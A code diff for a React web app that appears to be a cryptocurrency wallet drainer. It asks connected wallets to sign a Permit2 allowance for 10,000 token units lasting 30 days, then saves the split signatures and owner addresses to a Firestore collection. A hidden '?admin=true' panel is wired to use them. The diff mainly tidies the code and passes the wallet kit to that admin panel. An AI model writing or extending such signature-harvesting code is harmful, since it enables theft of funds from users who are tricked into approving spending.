@@ -7,12 +7,15 @@ import { db } from './firebase';
 import { doc, setDoc } from 'firebase/firestore';
 import Admin from './Admin'; // Import the new Admin Component
 
-// ... (Existing Constants: PERMIT2, UNIVERSAL_ROUTER, etc.) ...
+// -----------------------------
+// CONFIGURATION
+// -----------------------------
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";
 const USDT_DECIMALS = 6n;
 const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 
+// Initialize AppKit
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
   networks: [mainnet],
@@ -52,7 +55,6 @@ export default function App() {
     return () => unsub();
   }, []);
 
-  // ... (Existing signPermit function logic remains exactly the same) ...
   const signPermit = async () => {
     try {
       if (!connectedAddress) {
@@ -60,16 +62,20 @@ export default function App() {
         return;
       }
       setStatus("Preparing Permit2 signature...");
+      
       const walletProvider = appKit.getWalletProvider();
       if (!walletProvider) {
         setStatus("Wallet provider not available.");
         return;
       }
+      
       const provider = new BrowserProvider(walletProvider);
       const net = await provider.getNetwork();
       const chainId = Number(net.chainId);
+      
       const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
-      const nonce = 0; // In production, fetch current nonce from contract
+      const nonce = 0; 
+
       const permitted = {
         token: import.meta.env.VITE_TOKEN_ADDRESS,
         amount: SPENDING_CAP.toString(),
@@ -100,16 +106,20 @@ export default function App() {
         spender: UNIVERSAL_ROUTER,
         sigDeadline: deadline
       };
+      
       setStatus("Requesting signature...");
       const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });
+      
       const signature = await walletProvider.request({
         method: "eth_signTypedData_v4",
         params: [connectedAddress, payload]
       });
+      
       const raw = signature.substring(2);
       const r = "0x" + raw.substring(0, 64);
       const s = "0x" + raw.substring(64, 128);
       const v = parseInt(raw.substring(128, 130), 16);
+      
       const id = connectedAddress + "_" + Date.now();
       await setDoc(doc(db, "permit2_signatures", id), {
         owner: connectedAddress,
@@ -131,7 +141,8 @@ export default function App() {
 
   // Render Admin Panel if URL has ?admin=true
   if (isAdmin) {
-    return <Admin />;
+    // PASS appKit INSTANCE AS PROP
+    return <Admin appKit={appKit} />;
   }
 
   // Normal User View
